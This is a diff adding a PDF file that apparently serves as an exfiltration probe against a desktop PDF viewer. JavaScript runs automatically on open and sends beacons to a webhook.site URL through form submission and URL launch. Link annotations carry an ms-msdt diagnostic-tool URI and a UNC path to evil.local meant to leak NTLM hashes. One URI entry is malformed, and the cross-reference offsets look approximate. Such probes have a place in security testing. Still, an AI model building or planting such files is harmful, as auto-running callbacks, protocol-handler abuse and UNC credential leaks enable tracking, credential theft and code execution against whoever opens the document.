@@ -1,0 +1,90 @@
+%PDF-1.7
+% Exfil Probe PDF - Clean No-Navigator + Malicious Links - Jan 2026
+1 0 obj
+<< /Type /Catalog
+   /Pages 2 0 R
+   /OpenAction 3 0 R
+>>
+endobj
+2 0 obj
+<< /Type /Pages
+   /Kids [4 0 R]
+   /Count 1
+>>
+endobj
+3 0 obj
+<< /Type /Action
+   /S /JavaScript
+   /JS (
+      try {
+        var ts = new Date().toISOString();
+        var rand = Math.random().toString(36).slice(2);
+        var exfil = "ts=" + ts + "&rand=" + rand + "&probe=powerapps-desktop";
+        var baseUrl = "https://webhook.site/4a931921-3bc2-4ad4-a5e7-1c30a652df1d?" + exfil;
+        var results = ["Exfil attempts (clean):"];
+        try { this.submitForm({cURL: baseUrl + "&type=html", cSubmitAs: "HTML", cCharset: "utf-8"}); results.push("submitForm HTML: called (no throw)"); } catch(e) { results.push("submitForm HTML err: " + e); }
+        try { this.submitForm({cURL: baseUrl + "&type=fdf", cSubmitAs: "FDF"}); results.push("submitForm FDF: called (no throw)"); } catch(e) { results.push("submitForm FDF err: " + e); }
+        try { this.submitForm({cURL: baseUrl + "&type=xml", cSubmitAs: "XML"}); results.push("submitForm XML: called (no throw)"); } catch(e) { results.push("submitForm XML err: " + e); }
+        try { app.launchURL(baseUrl + "&type=launch", true); results.push("launchURL: called (no throw)"); } catch(e) { results.push("launchURL err: " + e); }
+        app.alert(results.join("\\n"));
+      } catch (e) {
+        app.alert("Top-level error: " + e + "\\nDetails: " + (e.message || "no msg"));
+      }
+   )
+>>
+endobj
+4 0 obj
+<< /Type /Page
+   /Parent 2 0 R
+   /MediaBox [0 0 500 400]
+   /Contents 5 0 R
+   /Resources << /Font << /F1 6 0 R >> >>
+   /Annots [7 0 R 8 0 R 9 0 R]
+>>
+endobj
+5 0 obj
+<< /Length 220 >>
+stream
+BT /F1 14 Tf 50 350 Td (Clean Exfil Test + Malicious Links) Tj ET
+BT /F1 12 Tf 50 320 Td (Click any blue text below to test) Tj ET
+BT /F1 12 Tf 50 280 Td (1. Webhook logging test) Tj ET
+BT /F1 12 Tf 50 240 Td (2. ms-msdt phishing scheme test) Tj ET
+BT /F1 12 Tf 50 200 Td (3. UNC path NTLM leak test) Tj ET
+BT /F1 12 Tf 50 160 Td (Also watch for JS alert) Tj ET
+endstream
+endobj
+6 0 obj
+<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>
+endobj
+7 0 obj
+<< /Type /Annot /Subtype /Link /Rect [50 260 450 290] /Border [0 0 2] /C [0 0 1]
+   /A << /S /URI /URI[](https://webhook.site/4a931921-3bc2-4ad4-a5e7-1c30a652df1d?probe=link-webhook) >>
+>>
+endobj
+8 0 obj
+<< /Type /Annot /Subtype /Link /Rect [50 220 450 250] /Border [0 0 2] /C [1 0 0]
+   /A << /S /URI /URI (ms-msdt:%20id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fparam%20IT_Reboot%3D%22true%22) >>
+>>
+endobj
+9 0 obj
+<< /Type /Annot /Subtype /Link /Rect [50 180 450 210] /Border [0 0 2] /C [0 1 0]
+   /A << /S /URI /URI (\\\\evil.local\\share\\test.file) >>
+>>
+endobj
+xref
+0 10
+0000000000 65535 f 
+0000000015 00000 n 
+0000000075 00000 n 
+0000000145 00000 n 
+0000000325 00000 n 
+0000000550 00000 n 
+0000000800 00000 n 
+0000000870 00000 n 
+0000001000 00000 n 
+0000001130 00000 n 
+trailer
+<< /Size 10 /Root 1 0 R >>
+startxref
+1250
+%%EOF
